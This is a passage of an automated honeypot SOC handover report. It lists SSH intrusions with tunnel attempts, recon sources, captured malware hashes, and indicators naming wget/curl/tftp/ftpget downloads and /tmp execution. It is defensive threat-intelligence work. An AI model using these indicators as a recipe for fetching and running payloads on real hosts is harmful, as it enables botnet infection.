| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:44:26` | `cowrie.session.connect` |
| `2026-07-20 22:44:26` | `cowrie.client.version` |
| `2026-07-20 22:44:26` | `cowrie.client.kex` |
| `2026-07-20 22:44:28` | `cowrie.login.success` |
| `2026-07-20 22:44:29` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:44:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.159.14[.]187` to AbuseIPDB if not already reported
- [ ] Block `200.159.14[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8f338df1048

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]3` |
| **First Seen** | 2026-07-20 22:44 |
| **Last Seen** | 2026-07-20 22:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:44:34` | `cowrie.session.connect` |
| `2026-07-20 22:44:35` | `cowrie.client.version` |
| `2026-07-20 22:44:35` | `cowrie.client.kex` |
| `2026-07-20 22:44:37` | `cowrie.login.success` |
| `2026-07-20 22:44:37` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:44:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]3` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-707e9fddfc18

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]123` |
| **First Seen** | 2026-07-20 22:52 |
| **Last Seen** | 2026-07-20 22:52 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 22:52:29` | `cowrie.session.connect` |
| `2026-07-20 22:52:30` | `cowrie.client.version` |
| `2026-07-20 22:52:30` | `cowrie.client.kex` |
| `2026-07-20 22:52:35` | `cowrie.login.success` |
| `2026-07-20 22:52:37` | `cowrie.direct-tcpip.request` |
| `2026-07-20 22:52:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]123` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]123` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `194.165.16[.]166` | **6** | 2026-07-20 21:12 | 2026-07-20 21:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-07-20 21:04 | 2026-07-20 22:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]121` | **3** | 2026-07-20 22:34 | 2026-07-20 22:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `221.159.21[.]170` | **2** | 2026-07-20 21:52 | 2026-07-20 21:54 | 1m | 0 | `T1592` | 🟢 LOW |
| `47.77.239[.]231` | **2** | 2026-07-20 22:00 | 2026-07-20 22:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `50.116.49[.]221` | **2** | 2026-07-20 22:24 | 2026-07-20 22:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `8.137.159[.]210` | **2** | 2026-07-20 22:15 | 2026-07-20 22:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `104.171.247[.]183` | 1 | 2026-07-20 22:52 | 2026-07-20 22:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.135.67[.]93` | 1 | 2026-07-20 21:40 | 2026-07-20 21:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.20.207[.]154` | 1 | 2026-07-20 22:06 | 2026-07-20 22:06 | 3s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | 1 | 2026-07-20 21:20 | 2026-07-20 21:20 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `179.61.192[.]156` | 1 | 2026-07-20 21:10 | 2026-07-20 21:11 | 72s | 0 | `T1592` | 🟢 LOW |
| `185.100.84[.]174` | 1 | 2026-07-20 22:28 | 2026-07-20 22:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]168` | 1 | 2026-07-20 22:45 | 2026-07-20 22:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]174` | 1 | 2026-07-20 22:45 | 2026-07-20 22:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-07-20 22:07 | 2026-07-20 22:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.16.103[.]46` | 1 | 2026-07-20 21:25 | 2026-07-20 21:25 | 26s | 0 | `T1592` | 🟢 LOW |
| `72.14.178[.]148` | 1 | 2026-07-20 21:03 | 2026-07-20 21:03 | 2s | 0 | `T1592` | 🟢 LOW |
| `77.83.72[.]79` | 1 | 2026-07-20 22:38 | 2026-07-20 22:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `79.136.8[.]69` | 1 | 2026-07-20 21:55 | 2026-07-20 21:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `83.239.108[.]218` | 1 | 2026-07-20 22:41 | 2026-07-20 22:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]3` | 1 | 2026-07-20 22:22 | 2026-07-20 22:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]11` | 1 | 2026-07-20 22:30 | 2026-07-20 22:31 | 31s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **25/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59b756899825573563cd53ae62bcd1f703a765f85797c352964e5246f04a85c0` | ELF Binary (Linux executable) (MIPS 32-bit) | `59b7568998255735...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `5ea3509f840f6cc8b36e4930c7f6514253c3be358c7f83683c021d51fe6a2b97` | ELF Binary (Linux executable) (x86 32-bit) | `5ea3509f840f6cc8...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `62.16.103[.]46` | RU | Net By Net Holding LLC | **100** ⚠️ | 50 |
| `197.156.97[.]198` | ET | To ERs logically close to BD-BR | **100** ⚠️ | 50 |
| `178.178.222[.]55` | RU | PJSC MegaFon | **100** ⚠️ | 50 |
| `178.178.222[.]60` | RU | PJSC MegaFon | **100** ⚠️ | 50 |
| `195.184.76[.]174` | US | FR ONYPHE | **100** ⚠️ | 50 |
| `23.30.11[.]253` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 50 |
| `101.13.5[.]49` | TW | Taiwan Mobile Co., Ltd. | **100** ⚠️ | 50 |
| `222.120.176[.]6` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `125.20.207[.]154` | IN | Bharti Televentures Limited A/c ABTS MP | **100** ⚠️ | 50 |
| `81.237.155[.]113` | SE | Telia Network Services | **100** ⚠️ | 45 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 99 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 87 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 8 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 8 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 1 |

---

## 🔕 False Positive Summary (15 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 140 cases |
| Tool 34  | Credential Extractor        | ✅ 112 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 95 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 15 filtered (10.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 64 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 87 priority case(s) shown individually · 23 recon entry/entries in table (7 group(s) consolidating 22 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-20T23:04:44Z_
